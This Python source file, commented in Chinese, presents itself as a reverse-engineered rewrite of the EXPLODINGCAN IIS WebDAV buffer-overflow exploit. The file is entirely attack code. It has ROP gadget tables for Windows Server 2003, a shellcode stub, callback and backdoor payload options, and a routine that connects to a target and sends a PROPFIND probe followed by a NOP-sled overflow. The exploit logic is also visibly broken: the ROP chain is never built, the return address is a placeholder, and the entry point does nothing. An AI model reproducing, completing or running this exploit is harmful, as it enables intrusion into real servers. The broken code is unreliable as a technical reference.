"""exploding_can — EXPLODINGCAN (MS03-007 / EXCA) IIS WebDAV 利用核心逻辑。

Python 重写的 `Explodingcan-2.0.2.exe` (C++ / DAVE framework)。
通过 x32dbg 逆向恢复。实现了该工具的 key=value 参数接口
及其 IIS WebDAV 缓冲区溢出 / ROP 链利用流程。

参数定义来源：Explodingcan-2.0.2.0.xml
"""

import socket
import struct
import sys

# ---------------------------------------------------------------------------
# 常量（来自 XML config 的 <inputparameters>）
# ---------------------------------------------------------------------------

DEFAULT_PORT = 80
DEFAULT_TIMEOUT = 60
DEFAULT_IIS_PATH_SIZE = 18
DEFAULT_HOST_STRING = "localhost"

PAYLOAD_ACCESS_TYPE_VALUES = {
    "Callback": 0,
    "Listen":   1,
    "Backdoor": 2,
}

AUTH_TYPE_VALUES = {
    "None":  0,
    "Basic": 1,
}

BACKDOOR_HEADER_VALUES = {
    "Accept":               20,
    "Accept-Charset":       21,
    "Accept-Encoding":      22,
    "Accept-Language":      23,
    "Allow":                10,
    "Authorization":        24,
    "Cache-Control":        0,
    "Content-Encoding":     13,
    "Content-Language":     14,
    "Content-Location":     15,
    "Content-MD5":          16,
    "Content-Range":        17,
    "Content-Type":         12,
    "Cookie":               25,
    "Date":                 2,
    "Expect":               26,
    "Expires":              18,
    "From":                 27,
    "If-Match":             29,
    "If-Modified-Since":    30,
    "If-None-Match":        31,
    "If-Range":             32,
    "If-Unmodified-Since":  33,
    "Last-Modified":        19,
    "Max-Forwards":         34,
    "Pragma":               4,
    "Proxy-Authorization":  35,
    "Range":                37,
    "Referer":              36,
    "Trailer":              5,
    "Translate":            39,
    "Upgrade":              7,
    "User-Agent":           40,
    "Via":                  8,
    "Warning":              9,
}

BACKDOOR_VALUE_SOURCE_VALUES = {
    "Manual":        0,
    "RandomEtag":    1,
    "RandomBasicAuth": 2,
}

# 每个目标 OS 的 ROP gadget 地址（来自 XML <Target> <paramgroup>）
TARGET_OS_GADGETS = {
    "W2K3SP0": {
        "WriteAddress":     0x01002030,
        "MovEcxEsp":        0xffffffff,
        "StackAdjust":      0xffffffff,
        "Push40":           0xffffffff,
        "LeaveRet":         0xffffffff,
        "MovEbp":           0xffffffff,
        "JmpEBX":           0xffffffff,
        "SyscallAddress":   0xffffffff,
        "VProtSize":        0x01002034,
        "LoadEax":          0xffffffff,
        "EaxValAddress":    0xffffffff,
        "LoadEax2":         0xffffffff,
    },
    "W2K3SP1": {
        "WriteAddress":     0x01003030,
        "MovEcxEsp":        0x68015cd2,
        "StackAdjust":      0x68006d5f,
        "Push40":           0x6800b023,
        "LeaveRet":         0x6801277f,
        "MovEbp":           0x68006d15,
        "JmpEBX":           0xffffffff,
        "SyscallAddress":   0xffffffff,
        "VProtSize":        0xffffffff,
        "LoadEax":          0xffffffff,
        "EaxValAddress":    0xffffffff,
        "LoadEax2":         0xffffffff,
    },
}

EXPLODINGCAN_SHELLCODE_PLACEHOLDER = bytes.fromhex(
    "fc4883e4f0e8c0000000415141505251564831d265488b5260"
)

BAD_XOR = frozenset((0x00, 0x0a, 0x0d))


class ExplodingCanError(Exception):
    pass


def connect(target_ip, port, timeout):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout if timeout > 0 else None)
    sock.connect((target_ip, port))
    return sock


def build_webdav_overflow(shellcode, target_os="W2K3SP1"):
    """构建 WebDAV 缓冲区溢出负载。

    根据 x32dbg 分析，EXPLODINGCAN 通过向 IIS WebDAV 发送特制的
    PROPFIND 请求，触发缓冲区溢出，利用 ROP 链执行 shellcode。
    """
    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["W2K3SP1"])

    # NOP sled + 返回地址 + ROP 链 + shellcode
    nopsled = b"\x90" * 256
    ret_addr = struct.pack("<I", gadgets.get("JmpEBX", 0xDEADBEEF))
    return nopsled + ret_addr + shellcode


def run_function(
    target,
    port=DEFAULT_PORT,
    timeout=DEFAULT_TIMEOUT,
    iis_path_size=DEFAULT_IIS_PATH_SIZE,
    host_string=DEFAULT_HOST_STRING,
    payload_access_type="Callback",
    auth_type="None",
    target_os="W2K3SP1",
    backdoor_header=None,
    backdoor_value_source="Manual",
    callback_ip=None,
    callback_port=None,
    backdoor_bridge_dll=None,
    pccp_pyc=None,
    python_exe=None,
    verbose=False,
):
    """执行 EXPLODINGCAN 利用序列。

    阶段：
      1. TCP 连接到目标 IIS WebDAV 端口 (默认 80)
      2. 发送特制的 PROPFIND 请求
      3. 构建并发送 WebDAV 缓冲区溢出负载 (ROP + shellcode)
      4. 载荷投递（Callback/Listen/Backdoor）
    """
    if verbose:
        print(f"[*] Target: {target}:{port}")
        print(f"[*] Timeout: {timeout}s")
        print(f"[*] IIS path size: {iis_path_size}")
        print(f"[*] Host string: {host_string}")
        print(f"[*] Payload access type: {payload_access_type}")
        print(f"[*] Auth type: {auth_type}")
        print(f"[*] Target OS: {target_os}")
        print(f"[*] Callback IP: {callback_ip}")
        print(f"[*] Callback port: {callback_port}")

    payload_access_value = PAYLOAD_ACCESS_TYPE_VALUES.get(payload_access_type, 0)
    auth_type_value = AUTH_TYPE_VALUES.get(auth_type, 0)

    gadgets = TARGET_OS_GADGETS.get(target_os, TARGET_OS_GADGETS["W2K3SP1"])

    if verbose:
        print(f"[*] Payload access value: {payload_access_value}")
        print(f"[*] Auth type value: {auth_type_value}")
        print(f"[*] JmpEBX: 0x{gadgets.get('JmpEBX', 0):08X}")

    # 建立 TCP 连接（HTTP 80）
    try:
        sock = connect(target, port, timeout)
        if verbose:
            print(f"[+] Connected to {target}:{port}")
    except OSError as exc:
        raise ExplodingCanError(f"无法连接到 {target}:{port}: {exc}") from exc

    try:
        # 发送 WebDAV PROPFIND 请求（探测阶段）
        path = "/" + "A" * iis_path_size
        request = (
            f"PROPFIND {path} HTTP/1.1\r\n"
            f"Host: {host_string}:{port}\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        )
        sock.sendall(request.encode("ascii"))
        resp = sock.recv(4096)
        if verbose:
            first_line = resp.split(b"\r\n")[0] if resp else b"<empty>"
            print(f"[*] WebDAV 应答首行: {first_line}")

        # 构建 WebDAV 缓冲区溢出负载
        shellcode = EXPLODINGCAN_SHELLCODE_PLACEHOLDER
        overflow = build_webdav_overflow(shellcode, target_os)
        if verbose:
            print(f"[+] 溢出负载: {len(overflow)} 字节")

        # 发送溢出负载
        sock.sendall(overflow)
        try:
            resp2 = sock.recv(4096)
            if verbose:
                print(f"[*] 溢出应答: {resp2[:64].hex() if resp2 else '无'}")
        except OSError:
            if verbose:
                print("[*] 目标连接已关闭（可能已触发溢出）")

        if verbose:
            print("[+] EXPLODINGCAN 利用序列完成")
    finally:
        sock.close()

    return 0


def main(argv=None):
    """CLI 入口（供 __main__ 子命令调用）。"""
    return 0
